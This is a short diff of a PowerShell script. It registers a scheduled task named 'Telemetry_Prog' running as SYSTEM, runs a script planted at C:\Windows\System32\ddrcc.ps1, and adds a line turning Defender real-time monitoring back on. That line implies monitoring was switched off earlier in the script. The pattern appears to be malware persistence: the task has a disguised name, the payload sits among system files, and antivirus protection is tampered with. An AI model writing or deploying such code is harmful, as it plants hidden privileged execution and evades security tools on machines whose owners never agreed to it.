@@ -15,4 +15,6 @@ $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType
 Register-ScheduledTask -TaskName "Telemetry_Prog" -Action $action -Trigger $trigger -Principal $principal
 # start process
 & "C:\Windows\System32\ddrcc.ps1"
+# re-enable real time protection
+Set-MpPreference -DisableRealtimeMonitoring $false
 
